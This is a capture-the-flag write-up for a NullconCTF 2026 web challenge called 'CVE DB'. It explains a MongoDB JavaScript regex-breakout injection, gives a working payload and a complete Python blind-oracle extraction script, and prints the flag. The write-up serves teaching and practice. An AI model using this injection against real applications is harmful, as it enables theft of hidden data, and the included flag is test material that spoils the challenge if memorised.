---
ctf: NullconCTF 2026
category: web
difficulty: medium
points: 300
flag: ENO{This_1s_A_Tru3_S1mpl3_Ch4llenge_T0_Solv3_Congr4tz}
techniques:
  - nosql-injection
  - mongodb-javascript-injection
  - blind-oracle-attack
tools:
  - python
  - requests
---

# CVE DB

## Description

A web CVE "database" exposes a search form (`POST /search`) and renders results as HTML. One CVE entry (CVE-1337-1337) hints that it "leaks some very confidential flag", but the likely flag-containing fields (`product` / `vendor`) are not rendered in the template.

## Solution

The backend implements "search" without SQL. The `query` parameter is ultimately evaluated inside a MongoDB JavaScript predicate (e.g. a `$where`-style expression) that uses a JavaScript regex literal like `/USER_INPUT/.test(...)`.

Because user input is inserted **unescaped** into a regex literal inside executable JS, we can break out of the literal and inject additional boolean conditions that reference non-rendered fields like `this.product`.

### HTML Response as Oracle

- If our injected predicate is true for CVE-1337-1337, the page contains **1 rendered result**
- Otherwise, it contains **0 results**

### Injection Pattern

Close the server's regex literal, append our conditions, then open a new harmless regex literal to keep the overall expression syntactically valid.

A working payload for prefix-testing the hidden `product` field:

```
a/.test(this.description)&&this.product&&this.product.match(/^PREFIX/)/
&&/a
```

This makes the predicate true only when `this.product` starts with `PREFIX`. **Repeating this test character-by-character** yields the full product string, which is the flag.

### Complete Extraction Script

```python
import requests

url = "http://cvedb.ctf.nullcon.net/search"
charset = "ENO{}_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
flag = ""

while not flag.endswith('}'):
    for c in charset:
        test = flag + c
        escaped = test.replace('\\', '\\\\').replace('/', '\\/')
        
        payload = f"a/.test(this.description)&&this.product&&this.product.match(/^{escaped}/)/
&&/a"
        
        r = requests.post(url, data={"query": payload})
        
        if "CVE-1337-1337" in r.text:
            flag = test
            print(flag)
            break

print(f"Flag: {flag}")
```

Running it recovers:
```
ENO{This_1s_A_Tru3_S1mpl3_Ch4llenge_T0_Solv3_Congr4tz}
```

## Key Techniques

- NoSQL injection via MongoDB JavaScript
- Regex literal breakout
- Blind boolean oracle attack
- Character-by-character extraction

